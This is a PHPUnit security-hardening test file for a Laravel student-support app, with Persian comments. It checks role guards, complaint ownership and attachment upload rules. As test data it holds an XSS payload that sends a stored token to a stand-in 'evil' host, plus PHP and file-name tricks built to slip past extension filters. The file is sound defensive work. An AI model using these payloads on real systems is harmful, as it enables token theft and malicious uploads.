<?php

namespace Tests\Feature;

use App\Models\Complaint;
use App\Models\Conversation;
use App\Models\Mentor;
use App\Models\Student;
use Illuminate\Http\Testing\File;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * بازبستن سه راه‌حل امنیتی بحرانی:
 *   ۱) مسیرهای محتوای پنل محافظ نقش نداشتند
 *   ۲) شکایت‌ها بدون بررسی مالکیت قابل خواندن/تغییر بودند
 *   ۳) پیوست‌ها allowlist نداشتند (XSS ذخیره‌شده) و بای‌پس اکستنشن داشتند
 */
class SecurityHardeningTest extends TestCase
{
    // ------------------------------------------------- ۱) محافظ نقش مسیرهای پنل

    /**
     * @return array<string, array{0: string, 1: string, 2: string}>
     */
    public static function panelContentEndpoints(): array
    {
        return [
            'delete faq' => ['deleteJson', '/api/faqs/1', 'CheckRole'],
            'update faq' => ['putJson', '/api/faqs/1', 'CheckRole'],
            'store faq' => ['postJson', '/api/faqs', 'CheckRole'],
            'delete video' => ['deleteJson', '/api/videos/1', 'CheckRole'],
            'update video' => ['putJson', '/api/videos/1', 'CheckRole'],
            'delete resource' => ['deleteJson', '/api/resources/1', 'CheckRole'],
            'store resource' => ['postJson', '/api/resources', 'CheckRole'],
            'list complaints' => ['getJson', '/api/complaints', 'CheckRole'],
            'complaint students' => ['getJson', '/api/complaints/students', 'CheckRole'],
            'complaint latest' => ['getJson', '/api/complaints/latest', 'CheckRole'],
            'update complaint' => ['putJson', '/api/complaints/1', 'CheckRole'],
            'pending shift reports' => ['getJson', '/api/shift-reports/pending', 'CheckRole'],
            'list shift reports' => ['getJson', '/api/shift-reports', 'CheckRole'],
            'update shift report' => ['putJson', '/api/shift-reports/1', 'CheckRole'],
        ];
    }

    #[DataProvider('panelContentEndpoints')]
    public function test_students_cannot_reach_panel_content_endpoints(
        string $method,
        string $uri,
    ): void {
        $student = $this->makeStudent();

        $this->actingAs($student, 'sanctum')
            ->{$method}($uri)
            ->assertStatus(403);
    }

    #[DataProvider('panelContentEndpoints')]
    public function test_observers_cannot_reach_panel_content_endpoints(
        string $method,
        string $uri,
    ): void {
        $observer = $this->makeObserver();

        $this->actingAs($observer, 'sanctum')
            ->{$method}($uri)
            ->assertStatus(403);
    }

    public function test_support_can_still_manage_panel_content(): void
    {
        $support = $this->makeSupport();

        $this->actingAs($support, 'sanctum')
            ->postJson('/api/faqs', [
                'question' => 'سوال آزمایشی',
                'answer' => 'پاسخ آزمایشی',
                'category' => 'general',
            ])->assertStatus(201);
    }

    // ------------------------------------------------- ۲) مالکیت شکایت

    public function test_support_cannot_read_or_modify_another_agents_complaint(): void
    {
        $owner = $this->makeSupport();
        $intruder = $this->makeSupport();

        $complaint = Complaint::create([
            'student_id' => Student::create(['name' => 'دانشجو تست'])->id,
            'mentor_id' => Mentor::create(['name' => 'منتور تست'])->id,
            'support_id' => $owner->id,
            'description' => 'شکایت محرمانه',
            'status' => 'open',
        ]);

        $this->actingAs($intruder, 'sanctum')
            ->getJson("/api/complaints/{$complaint->id}")
            ->assertStatus(403);

        $this->actingAs($intruder, 'sanctum')
            ->putJson("/api/complaints/{$complaint->id}", ['status' => 'resolved'])
            ->assertStatus(403);

        $this->assertSame('open', $complaint->fresh()->status);
    }

    public function test_owner_and_admin_can_still_access_their_complaint(): void
    {
        $owner = $this->makeSupport();
        $admin = $this->makeAdmin();

        $complaint = Complaint::create([
            'student_id' => Student::create(['name' => 'دانشجو تست'])->id,
            'mentor_id' => Mentor::create(['name' => 'منتور تست'])->id,
            'support_id' => $owner->id,
            'description' => 'شکایت',
            'status' => 'open',
        ]);

        $this->actingAs($owner, 'sanctum')
            ->getJson("/api/complaints/{$complaint->id}")
            ->assertStatus(200);

        $this->actingAs($admin, 'sanctum')
            ->getJson("/api/complaints/{$complaint->id}")
            ->assertStatus(200);
    }

    public function test_students_list_is_scoped_to_the_viewers_own_complaints(): void
    {
        $mine = $this->makeSupport();
        $other = $this->makeSupport();

        $myStudent = Student::create(['name' => 'دانشجوی من']);
        $otherStudent = Student::create(['name' => 'دانشجوی دیگری']);

        Complaint::create([
            'student_id' => $myStudent->id,
            'mentor_id' => Mentor::create(['name' => 'منتور یک'])->id,
            'support_id' => $mine->id,
            'description' => 'شکایت من',
            'status' => 'open',
        ]);

        Complaint::create([
            'student_id' => $otherStudent->id,
            'mentor_id' => Mentor::create(['name' => 'منتور دو'])->id,
            'support_id' => $other->id,
            'description' => 'شکایت دیگری',
            'status' => 'open',
        ]);

        // پشتیبان فقط دانشجویان شکایت‌های خودش را می‌بیند
        $scoped = $this->actingAs($mine, 'sanctum')
            ->getJson('/api/complaints/students')
            ->assertStatus(200)
            ->json('data');

        $this->assertCount(1, $scoped);
        $this->assertSame('دانشجوی من', $scoped[0]['name']);

        // ادمین هر دو را می‌بیند
        $all = $this->actingAs($this->makeAdmin(), 'sanctum')
            ->getJson('/api/complaints/students')
            ->assertStatus(200)
            ->json('data');

        $names = array_column($all, 'name');
        $this->assertContains('دانشجوی من', $names);
        $this->assertContains('دانشجوی دیگری', $names);
    }

    // ------------------------------------------------- ۳) آپلود پیوست

    /**
     * مارک‌آپ (html/svg) به‌عنوان فایل کد پذیرفته می‌شود، اما هرگز اجرا نمی‌شود.
     *
     * پذیرشِ پسوند با امن بودنِ سرو یکی نیست: `AttachmentController` همیشه
     * ‎application/octet-stream‎ + ‎Content-Disposition: attachment‎ +
     * ‎X-Content-Type-Options: nosniff‎ + CSP ‎sandbox‎ می‌فرستد، پس مرورگر
     * این فایل‌ها را رندر یا اجرا نمی‌کند و فقط دانلود می‌کند. این آزمون همان
     * invariant را نگه می‌دارد.
     *
     * پسوندهای اجراشدنی روی دیسک (‎.php‎/‎.phtml‎) همچنان رد می‌شوند؛ آن‌ها را
     * {@see self::test_extension_with_trailing_whitespace_cannot_smuggle_php()}
     * پوشش می‌دهد.
     */
    public function test_html_and_svg_attachments_are_accepted_but_never_served_as_executable_content(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست امنیت',
        ]);

        $payload = '<script>fetch("//evil/"+localStorage.aio_token)</script>';

        foreach (['payload.html', 'payload.svg', 'payload.htm'] as $name) {
            $response = $this->actingAs($student, 'sanctum')
                ->postJson("/api/conversations/{$conversation->id}/messages", [
                    'body' => 'ارسال فایل کد',
                    'attachment' => File::fake()->createWithContent($name, $payload),
                ])
                ->assertStatus(201);

            $served = $this->actingAs($student, 'sanctum')
                ->get((string) $response->json('data.url'))
                ->assertStatus(200);

            // هدرهایی که اجازه‌ی رندر یا اجرا نمی‌دهند
            $served->assertHeader('Content-Type', 'application/octet-stream');
            $served->assertHeader('X-Content-Type-Options', 'nosniff');
            $served->assertHeader('Content-Security-Policy', "default-src 'none'; sandbox");

            // نامِ روی دیسک تصادفی است، ولی باید `attachment` باشد نه `inline`
            $disposition = (string) $served->headers->get('Content-Disposition');
            $this->assertStringStartsWith('attachment;', $disposition);
            $this->assertStringNotContainsString('inline', $disposition);
            // و پسوندِ اصلی حفظ شده باشد
            $this->assertMatchesRegularExpression(
                '/\.'.preg_quote(pathinfo($name, PATHINFO_EXTENSION), '/').'"$/',
                $disposition,
            );
        }
    }

    /**
     * سورسِ php هم به‌عنوان فایل کد پذیرفته می‌شود، اما هرگز اجرا نمی‌شود.
     *
     * این امن است چون فایل‌ها در ‎storage/app/public‎ ذخیره می‌شوند که ریشه‌ی
     * وب نیست، و nginx هیچ ‎location ~ \.php$‎ ندارد — هر درخواستی با
     * ‎index.php‎ به‌عنوان front controller عبور می‌کند، پس هیچ فایلی روی
     * دیسک اجرا نمی‌شود. تنها راه خواندن، ‎GET /api/attachments/…‎ با احراز
     * هویت است که همیشه octet-stream + ‎attachment‎ برمی‌گرداند.
     */
    public function test_php_attachments_are_accepted_but_never_served_as_executable_content(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست سورس php',
        ]);

        foreach (['index.php', 'view.phtml'] as $name) {
            $response = $this->actingAs($student, 'sanctum')
                ->postJson("/api/conversations/{$conversation->id}/messages", [
                    'body' => 'ارسال سورس',
                    'attachment' => File::fake()->createWithContent($name, '<?php echo "pwned"; ?>'),
                ])
                ->assertStatus(201);

            $served = $this->actingAs($student, 'sanctum')
                ->get((string) $response->json('data.url'))
                ->assertStatus(200);

            $served->assertHeader('Content-Type', 'application/octet-stream');
            $served->assertHeader('X-Content-Type-Options', 'nosniff');
            $served->assertHeader('Content-Security-Policy', "default-src 'none'; sandbox");

            $disposition = (string) $served->headers->get('Content-Disposition');
            $this->assertStringStartsWith('attachment;', $disposition);
            $this->assertStringNotContainsString('inline', $disposition);

            // محتوا باید همان سورس باشد، نه خروجی اجراشده
            $this->assertStringContainsString('<?php echo "pwned"; ?>', $served->getContent());
        }
    }

    /**
     * فایل ذخیره‌شده هرگز از مسیر استاتیک در دسترس نیست.
     *
     * این همان چیزی است که ‎.php‎ را بی‌خطر می‌کند: اگر نشانی برگشتی
     * ‎/storage/…‎ بود، فایل بدون احراز هویت و بدون هدرهای ایمن سرو می‌شد.
     */
    public function test_stored_attachments_are_never_exposed_on_a_static_path(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست مسیر',
        ]);

        $url = (string) $this->actingAs($student, 'sanctum')
            ->postJson("/api/conversations/{$conversation->id}/messages", [
                'body' => 'سورس',
                'attachment' => File::fake()->createWithContent('index.php', '<?php echo "pwned"; ?>'),
            ])
            ->assertStatus(201)
            ->json('data.url');

        $this->assertStringStartsWith('/api/attachments/', $url);
        $this->assertStringNotContainsString('/storage/', $url);
    }

    /**
     * محتوای php نباید با پسوند تصویر رد شود.
     */
    public function test_php_content_cannot_slip_through_under_an_image_extension(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست دور زدن پسوند',
        ]);

        foreach (['photo.png', 'photo.jpg'] as $name) {
            $this->actingAs($student, 'sanctum')
                ->postJson("/api/conversations/{$conversation->id}/messages", [
                    'body' => 'عکس جعلی',
                    'attachment' => File::fake()->createWithContent($name, '<?php echo "pwned"; ?>'),
                ])
                ->assertStatus(422);
        }
    }

    /**
     * محتوای HTML نباید با پسوند تصویرِ واقعی رد شود.
     *
     * ‎.png‎/‎.gif‎/‎.jpg‎ در گروه «تصویر» می‌مانند و فقط نوع‌های تصویریِ
     * واقعی را قبول می‌کنند، پس یک فایل متنی با این نام‌ها همچنان ۴۲۲ می‌گیرد.
     * ‎.svg‎ عمداً در گروه «متن/مارک‌آپ» است و پذیرفته می‌شود، ولی چون
     * سرور همیشه octet-stream + ‎attachment‎ می‌فرستد رندر نمی‌شود.
     */
    public function test_html_content_cannot_slip_through_under_an_image_extension(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست دور زدن پسوند',
        ]);

        foreach (['photo.png', 'photo.gif', 'photo.jpg'] as $name) {
            $this->actingAs($student, 'sanctum')
                ->postJson("/api/conversations/{$conversation->id}/messages", [
                    'body' => 'عکس جعلی',
                    'attachment' => File::fake()->createWithContent(
                        $name,
                        '<script>fetch("//evil/"+localStorage.aio_token)</script>',
                    ),
                ])
                ->assertStatus(422);
        }
    }

    /**
     * فاصله/نقطه‌ی انتهاییِ نام فایل باید نرمال شود، نه اینکه از فیلتر رد شود.
     *
     * روی ویندوز NTFS فاصله و نقطه‌ی انتهایی حذف می‌شوند، پس «shell.php␠»
     * روی دیسک با پسوند ‎php‎ ذخیره می‌شد. آن‌وقت فیلترِ مبتنی بر رشته‌ی
     * خام می‌توانست پسوندِ خطرناک را از چشم پنهان کند.
     *
     * چون سورس php حالا مجاز است، آزمون روی «رد شدن» تمرکز نمی‌کند بلکه روی
     * خودِ نرمال‌سازی: پسوند ذخیره‌شده باید دقیقاً همان ‎php‎ باشد — نه با
     * فاصله، نه با حرف بزرگ — و فایل باید بی‌اثر سرو شود.
     */
    public function test_extension_with_trailing_whitespace_is_normalised_to_the_real_extension(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست بای‌پس',
        ]);

        foreach (['shell.php ' => 'php', 'shell.pHp ' => 'php', 'shell.phtml ' => 'phtml'] as $name => $expected) {
            $response = $this->actingAs($student, 'sanctum')
                ->postJson("/api/conversations/{$conversation->id}/messages", [
                    'body' => 'ارسال سورس',
                    'attachment' => File::fake()->createWithContent(
                        $name,
                        '<?php echo "pwned"; ?>',
                    ),
                ])
                ->assertStatus(201);

            $url = (string) $response->json('data.url');

            // پسوندِ نرمال‌شده روی دیسک: حروف کوچک، بدون فاصله
            $this->assertStringEndsWith('.'.$expected, $url);
            $this->assertSame(
                $expected,
                pathinfo((string) parse_url($url, PHP_URL_PATH), PATHINFO_EXTENSION),
            );

            $served = $this->actingAs($student, 'sanctum')->get($url)->assertStatus(200);
            $served->assertHeader('Content-Type', 'application/octet-stream');
            $served->assertHeader('X-Content-Type-Options', 'nosniff');
        }
    }

    /**
     * نقطه‌ی انتهایی پسوندِ خالی می‌سازد و باید رد شود.
     *
     * ‎shell.php.‎ در عمل ‎shell.php‎ است، ولی Symfony پسوند را خالی
     * برمی‌گرداند؛ «بسته» جواب‌دادن (fail closed) امن‌تر از حدس‌زدن است.
     */
    public function test_a_trailing_dot_yields_an_empty_extension_and_is_rejected(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست پسوند خالی',
        ]);

        $this->actingAs($student, 'sanctum')
            ->postJson("/api/conversations/{$conversation->id}/messages", [
                'body' => 'نامِ مشکوک',
                'attachment' => File::fake()->createWithContent('shell.php.', '<?php echo "pwned"; ?>'),
            ])
            ->assertStatus(422);
    }

    public function test_content_type_must_match_the_extension(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست ناهماهنگی',
        ]);

        // پسوند عکس ولی محتوای اسکریپت
        $this->actingAs($student, 'sanctum')
            ->postJson("/api/conversations/{$conversation->id}/messages", [
                'body' => 'عکس جعلی',
                'attachment' => File::fake()->createWithContent(
                    'photo.png',
                    '<script>alert(1)</script>',
                ),
            ])->assertStatus(422);
    }

    public function test_legitimate_image_upload_still_works(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست معتبر',
        ]);

        $png = base64_decode(
            'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='
        );

        $this->actingAs($student, 'sanctum')
            ->postJson("/api/conversations/{$conversation->id}/messages", [
                'body' => 'تصویر واقعی',
                'attachment' => File::fake()->createWithContent('shot.png', $png),
            ])->assertStatus(201);
    }

    public function test_attachments_are_not_served_as_executable_content(): void
    {
        $student = $this->makeStudent();
        $conversation = Conversation::create([
            'student_id' => $student->id,
            'title' => 'تست سرو',
        ]);

        $response = $this->actingAs($student, 'sanctum')
            ->postJson("/api/conversations/{$conversation->id}/messages", [
                'body' => 'فایل',
                'attachment' => File::fake()->createWithContent(
                    'note.txt',
                    'متن ساده',
                ),
            ])->assertStatus(201);

        $url = $response->json('data.url');

        $this->assertStringNotContainsString('/storage/', (string) $url);

        $served = $this->actingAs($student, 'sanctum')->get((string) $url);

        $served->assertStatus(200);
        // باید به‌صورت دانلود سرو شود، نه اجرا
        $served->assertHeader('X-Content-Type-Options', 'nosniff');
        $this->assertStringContainsString(
            'application/octet-stream',
            (string) $served->headers->get('Content-Type'),
        );
        $this->assertStringContainsString(
            'attachment',
            (string) $served->headers->get('Content-Disposition'),
        );
    }

    // ------------------------------------------------- ۴) ریت‌لیمیت

    public function test_complaints_limit_parameter_is_bounded(): void
    {
        $support = $this->makeSupport();

        $this->actingAs($support, 'sanctum')
            ->getJson('/api/complaints/latest?limit=10000000')
            ->assertStatus(422);
    }
}
